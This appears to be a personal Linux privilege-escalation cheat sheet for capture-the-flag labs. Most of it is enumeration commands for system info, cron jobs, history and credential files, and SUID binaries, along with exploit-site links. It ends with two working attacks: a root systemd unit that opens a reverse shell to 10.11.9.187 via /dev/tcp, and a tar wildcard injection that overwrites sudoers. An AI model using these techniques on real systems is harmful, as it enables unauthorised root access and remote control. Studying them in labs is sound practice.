Linux Privilege Escalation

**************************************Automated Scripts**************************************** 
#1. LinENUM.sh
#2. LinuxPrivChecker.py
#3. LinPeas.sh
#4. lse.sh

1. Distribution Types:

	cat /etc/issue
	cat /etc/*-release
	cat /etc/lsb-release      # Debian based
    cat /etc/redhat-release   # Redhat based
	
2. Kernel Versions

	uname -a 
	uname -rms
	
3. Services & Prvileges

	ps aux 
	ps -ef 
	
4. Scheduled jobs & scripts

	crontab -l 
	ls -alh /var/spool/cron
	ls -al /etc/ | grep cron
	ls -al /etc/cron*

	cat /etc/at.allow
	cat /etc/at.deny
	cat /etc/cron.allow
	cat /etc/cron.deny
	cat /etc/crontab
	cat /etc/anacrontab
	cat /var/spool/cron/crontabs/root
	
5. Recurssive search for user & Password (using grep)

	grep -i user [filename]
	grep -i pass [filename]
	grep -C 5 "password" [filename]
	find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla

6. Passwords in Scripts

	cat /var/apache2/config.inc
	cat /var/lib/mysql/mysql/user.MYD
	cat /root/anaconda-ks.cfg	

7. Sensitive info in history

	cat ~/.bash_history
	cat ~/.nano_history
	cat ~/.atftp_history
	cat ~/.mysql_history
	cat ~/.php_history
	
8. settings/files (hidden) on website

	ls -alhR /var/www/
	ls -alhR /srv/www/htdocs/
	ls -alhR /usr/local/www/apache22/data/
	ls -alhR /opt/lampp/htdocs/
	ls -alhR /var/www/html/
9. Advanced Linux file Permissions

	find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
	find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
	find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
	find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
	find / -perm -4000 2>dev/null
	for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    
	
	# Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
	
10. Finding exoloits:

	
	http://www.exploit-db.com

	http://1337day.com

	http://www.securiteam.com

	http://www.securityfocus.com

	http://www.exploitsearch.net

	http://metasploit.com/modules/

	http://securityreason.com

	http://seclists.org/fulldisclosure/
	
	http://www.google.com
	
11. Pre-Complied Binaries

	http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/

	http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/

	
*****SYSTEMCTL suid bit set************
systemctl setuid bit 

[Unit]
Description=rooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.11.9.187/9002 0>&1'

[Install]
WantedBy=multi-user.target

www-data@vulnuniversity:/bin/systemctl enable /tmp/root.service
www-data@vulnuniversity:/tmp$ /bin/systemctl start root


*****Cronjob wildcard injection**********
www-data@skynet:/var/www/html$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > test.sh
www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh test.sh"
www-data@skynet:/var/www/html$ echo "" > --checkpoint=1






